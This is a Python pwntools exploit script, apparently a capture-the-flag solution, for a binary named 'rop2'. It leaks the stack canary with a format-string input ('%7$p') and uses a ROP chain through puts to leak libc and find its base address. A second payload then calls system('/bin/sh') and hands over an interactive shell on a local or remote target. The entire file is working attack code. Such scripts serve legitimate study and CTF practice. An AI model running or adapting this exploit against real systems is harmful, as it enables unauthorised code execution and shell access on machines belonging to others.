#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './rop2'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400993 # pop rdi ; ret

# elf, libc
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
main = elf.symbols['main']

# fmt
fmt="%7$p"
# debug()
ru('I\'ll give u some gift to help u!\n')
sl(fmt)
canary = int(rc(0x12),16)
info_addr('canary',canary)# rop1

# rop1
payload =  p64(0xdeadbeef)*3
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(main)

ru('Pull up your sword and tell me u story!\n')
sl(payload)

puts = u64(rc(6).ljust(8,'\0'))
info_addr('puts',puts)
libc_base = puts - libc.symbols['puts']
system = libc.symbols['system'] + libc_base
binsh = libc.search('/bin/sh').next() + libc_base
info_addr('system', system)
info_addr('binsh', binsh)

# rop2
fmt="%7$p"
# debug()
ru('I\'ll give u some gift to help u!\n')
sl(fmt)
canary = int(rc(0x12),16)
info_addr('canary',canary)# rop1

ppr = 0x0000000000400991 # pop rsi ; pop r15 ; ret
payload2 =  p64(0xdeadbeef)*3
payload2 += p64(canary)
payload2 += p64(0xdeadbeef)
payload2 += p64(ppr) + p64(0)*2
payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)
#payload2 = payload2.ljust(200,'\0')
ru('Pull up your sword and tell me u story!\n')
sl(payload2)

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

